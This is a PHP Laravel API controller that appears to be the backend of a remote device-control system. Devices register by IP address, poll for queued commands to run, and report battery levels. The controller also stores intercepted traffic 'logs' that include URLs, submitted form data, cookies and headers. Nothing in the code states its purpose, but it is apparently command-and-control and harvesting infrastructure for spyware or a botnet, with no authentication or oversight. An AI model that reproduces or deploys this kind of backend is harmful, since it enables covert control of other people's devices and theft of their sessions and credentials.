<?php

namespace App\Http\Controllers\Api;

use Illuminate\Http\Request;
use App\Http\Controllers\Controller;

use App\Model\Devices;
use App\Model\DevicesLogs;
use App\Model\Commands;

class ApiController extends Controller
{

    protected function getCommand($device_name) {

        $select_command = Commands::where('command_device', $device_name)
            ->where('command_exec', '0')
            ->get();
        if(count($select_command) < 1) {

            return ['error' => '', 'success' => 'true', 'data' => ['command_text' => '']];
        }
        else {

            $command = [];
            foreach ($select_command as $value){
                $value->command_exec = '1';
                $value->save();
                $command[] = ['command_text' => $value->command_text];
            }
            return ['error' => '', 'success' => 'true', 'data' => $command];
        }
    }

    public function listenCommand() {

        $device_name = $_SERVER['REMOTE_ADDR'];
        $select_devices = Devices::where('device_name', $device_name)
            ->first();
        if(!$select_devices) {

            $device_address = $_SERVER['REMOTE_ADDR'];
            $device = new Devices();
            $device->device_name = $device_name;
            $device->device_online = 1;
            $device->device_address = $device_address;
            $device->save();
        } else {
            $select_devices->device_online = 1;
            $select_devices->save();
        }

        return response()->json($this->getCommand($device_name));
    }

    public function sendElement(Request $data){
        $device_name = $_SERVER['REMOTE_ADDR'];
        $select_devices = Devices::where('device_name', $device_name)
            ->first();

        if(!$select_devices){
            exit();
        }


        if($data->insertType == "sendBattery" && isset($data->data["batteryLevel"])) {

           $select_devices->device_power = $data->data["batteryLevel"];
           $select_devices->save();

        } else if($data->insertType == "sendLogs" && isset($data->data["log_src"])) {

                $log = new DevicesLogs();
                $log->log_device = $device_name;
                $log->log_layers = $data->data["log_layers"];
                $log->log_host   = $data->data["log_host"];
                $log->log_url    = $data->data["log_url"];
                $log->log_method = $data->data["log_method"];
                $log->log_form   = $data->data["log_form"];
                $log->log_cookie = $data->data["log_cookie"];
                $log->log_headers= $data->data["log_headers"];
                $log->log_src    = $data->data["log_src"];
                $log->log_dest   = $data->data["log_dest"];
                $log->save();
        }
    }
}
